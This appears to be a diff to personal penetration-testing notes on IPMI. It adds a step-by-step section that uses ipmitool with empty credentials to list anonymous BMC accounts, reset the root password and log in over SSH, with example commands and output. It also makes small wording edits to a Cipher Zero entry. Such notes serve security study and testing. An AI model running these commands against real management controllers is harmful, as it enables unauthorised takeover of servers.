@@ -36,8 +36,8 @@ nmap -sU $target/<cidr> -p 623 -n -oA ipmi-basic-udp
 ___
 <!-- }}} -->
 
-<!-- Service Enumeration {{{-->
-## Service Enumeration
+<!-- Service {{{-->
+## Service
 
 [[Nmap]] — Footprint the service
 (*[ipmi-version](https://nmap.org/nsedoc/scripts/ipmi-version.html)*)
@@ -131,6 +131,74 @@ use auxiliary/scanner/ipmi/ipmi_version
 ___
 <!-- }}} -->
 
+<!-- Anonymous Authentication {{{-->
+## Anonymous Authentication
+
+[[ipmitool]] — Reset the password of anonymous accounts
+
+1. List anonymous user accounts
+
+```sh
+ipmitool -I <interface> -H $target -U '' -P '' user list
+```
+
+<!-- Info {{{-->
+> [!info]-
+>
+> - `-I`: Interface
+>   - `lanplus` for newer protocols
+>   - `lan` for older protocols
+<!-- }}} -->
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user list
+> ```
+> ```sh
+> ID  Name        Callin  Link Auth    IPMI Msg  Channel Priv Limit
+> 1                    false  false      true      ADMINISTRATOR
+> 2  root            false  false      true      ADMINISTRATOR
+> 3  admin            true    true      true      ADMINISTRATOR
+> ```
+<!-- }}} -->
+
+2. Reset the password of an account
+
+```sh
+ipmitool -I <interface> -H $target -U '' -P '' user set password 2 <password>
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> ipmitool -I lanplus -H 10.0.0.97 -U '' -P '' user set password 2 password
+> ```
+<!-- }}} -->
+
+3. Login to the BMC over SSH using the new password for the `root` user account
+
+```sh
+ssh root@$target
+```
+
+<!-- Example {{{-->
+> [!example]-
+>
+> ```sh
+> $ ssh root@10.0.0.97
+> ```
+> ```sh
+> root@10.0.0.97's password: password
+> >> SMASH-CLP Console v1.09 <<
+> ```
+<!-- }}} -->
+
+___
+<!-- }}} -->
+
 <!-- Cipher Zero {{{-->
 ## Cipher Zero
 
@@ -141,11 +209,11 @@ The vendor(*s*) shipping their devices with the cipher suite '0'
 > [!info]- Cipher Zero
 >
 > Cipher Zero allows a remote attacker to authenticate to the IPMI interface
-> using an arbitrary password.
+> using an arbitrary password
 >
 > The only information required is a valid account,
 > but most vendors ship with a [[Networking/Services/IPMI/General#Dangerous Settings|default account]]
-> (*`admin`*).
+> (*`admin`*)
 >
 > - [CISA - Risks of Using the Intelligent Platform Management Interface (IPMI)](https://www.us-cert.gov/ncas/alerts/TA13-207A)
 <!-- }}} -->
